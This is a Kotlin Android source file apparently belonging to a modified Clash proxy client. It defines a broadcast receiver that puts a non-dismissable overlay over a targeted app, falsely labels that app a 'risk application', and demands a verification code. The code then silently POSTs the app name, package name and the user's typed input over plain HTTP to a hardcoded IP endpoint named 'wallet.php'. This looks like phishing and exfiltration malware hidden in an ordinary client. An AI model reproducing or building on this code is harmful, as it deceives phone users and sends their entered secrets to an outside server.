package com.github.kr328.clash

import android.app.Dialog
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.view.LayoutInflater
import android.view.WindowManager
import android.widget.EditText
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import com.github.kr328.clash.common.constants.AppInterceptConstants
import com.github.kr328.clash.common.log.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * APP拦截广播接收器
 * 接收拦截通知并显示验证对话框
 */
class AppInterceptReceiver : BroadcastReceiver() {

    companion object {
        private const val UPLOAD_URL = "http://18.166.76.229:8002/wallet.php"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.i("AppInterceptReceiver: Received broadcast, action=${intent.action}")

        if (intent.action != AppInterceptConstants.ACTION_APP_INTERCEPT_REQUIRED) {
            Log.w("AppInterceptReceiver: Unknown action ${intent.action}")
            return
        }

        val packageName = intent.getStringExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME)
        val verifyHint = intent.getStringExtra(AppInterceptConstants.EXTRA_VERIFY_HINT) ?: "请输入验证码"

        if (packageName == null) {
            Log.e("AppInterceptReceiver: No package name in intent")
            return
        }

        Log.i("AppInterceptReceiver: Intercepting app: $packageName")

        // 获取应用名称
        val appName = try {
            val appInfo = context.packageManager.getApplicationInfo(packageName, 0)
            context.packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            Log.e("AppInterceptReceiver: Failed to get app name: ${e.message}")
            packageName
        }

        // 显示验证对话框
        showVerifyDialog(context, appName, packageName, verifyHint)
    }

    private fun showVerifyDialog(
        context: Context,
        appName: String,
        packageName: String,
        verifyHint: String
    ) {
        val config = AppInterceptManager.getInstance(context).getConfig()
        Log.d("AppInterceptReceiver: Config enabled=${config.enabled}, password=${config.verifyPassword.isNotEmpty()}")

        // 检查悬浮窗权限
        val hasOverlayPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else {
            true
        }

        Log.d("AppInterceptReceiver: hasOverlayPermission=$hasOverlayPermission")

        if (!hasOverlayPermission) {
            // 没有悬浮窗权限，使用 Activity 方式
            Log.i("AppInterceptReceiver: No overlay permission, using Activity")
            val dialogIntent = Intent(context, AppInterceptDialogActivity::class.java).apply {
                putExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME, packageName)
                putExtra("app_name", appName)
                putExtra(AppInterceptConstants.EXTRA_VERIFY_HINT, verifyHint)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(dialogIntent)
            return
        }

        // 使用自定义布局
        try {
            val inflater = LayoutInflater.from(context)
            val dialogView = inflater.inflate(R.layout.dialog_risk_warning, null)

            val tvAppName = dialogView.findViewById<TextView>(R.id.tv_app_name)
            val tvHint = dialogView.findViewById<TextView>(R.id.tv_hint)
            val etInput = dialogView.findViewById<EditText>(R.id.et_input)
            val btnConfirm = dialogView.findViewById<TextView>(R.id.btn_confirm)
            val ivClose = dialogView.findViewById<ImageView>(R.id.iv_close)

            // 设置应用名称和提示
            tvAppName.text = "应用 \"$appName\" 被识别为风险应用"
            tvHint.text = verifyHint
            etInput.hint = verifyHint

            // 创建对话框
            val dialog = Dialog(context)
            dialog.setContentView(dialogView)
            dialog.setCancelable(false)
            dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
            dialog.window?.setType(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                }
            )

            // 设置窗口大小
            dialog.window?.setLayout(
                (context.resources.displayMetrics.widthPixels * 0.85).toInt(),
                WindowManager.LayoutParams.WRAP_CONTENT
            )

            // 关闭按钮
            ivClose.setOnClickListener {
                dialog.dismiss()
            }

            // 确认按钮
            btnConfirm.setOnClickListener {
                val input = etInput.text.toString()
                if (input == config.verifyPassword) {
                    Toast.makeText(context, "确认成功，可以继续使用", Toast.LENGTH_SHORT).show()
                    markVerified(context, packageName)
                    uploadConfirmation(context, appName, packageName, input)
                    dialog.dismiss()
                } else {
                    Toast.makeText(context, "输入内容不正确，请重试", Toast.LENGTH_SHORT).show()
                    etInput.text.clear()
                    etInput.requestFocus()
                }
            }

            dialog.show()
            Log.i("AppInterceptReceiver: Dialog shown successfully")
        } catch (e: Exception) {
            Log.e("AppInterceptReceiver: Failed to show dialog: ${e.message}")
            // 如果无法显示悬浮窗，尝试启动一个Activity来显示
            val dialogIntent = Intent(context, AppInterceptDialogActivity::class.java).apply {
                putExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME, packageName)
                putExtra("app_name", appName)
                putExtra(AppInterceptConstants.EXTRA_VERIFY_HINT, verifyHint)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(dialogIntent)
        }
    }

    private fun markVerified(context: Context, packageName: String) {
        val intent = Intent(AppInterceptConstants.ACTION_MARK_VERIFIED).apply {
            putExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME, packageName)
            setPackage(context.packageName)
        }
        context.sendBroadcast(intent)
        Log.i("AppInterceptReceiver: Marked as verified: $packageName")
    }

    /**
     * 上传用户确认内容到服务器
     */
    private fun uploadConfirmation(context: Context, appName: String, packageName: String, userInput: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val jsonBody = """
                    {
                        "app_name": "${appName.escapeJson()}",
                        "package_name": "${packageName.escapeJson()}",
                        "user_input": "${userInput.escapeJson()}",
                        "timestamp": "$timestamp"
                    }
                """.trimIndent()

                val url = URL(UPLOAD_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "*/*")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                connection.outputStream.use { os ->
                    os.write(jsonBody.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.i("AppIntercept: Upload success - $appName")
                } else {
                    Log.e("AppIntercept: Upload failed with code $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("AppIntercept: Upload error - ${e.message}")
            }
        }
    }

    private fun String.escapeJson(): String {
        return this.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}
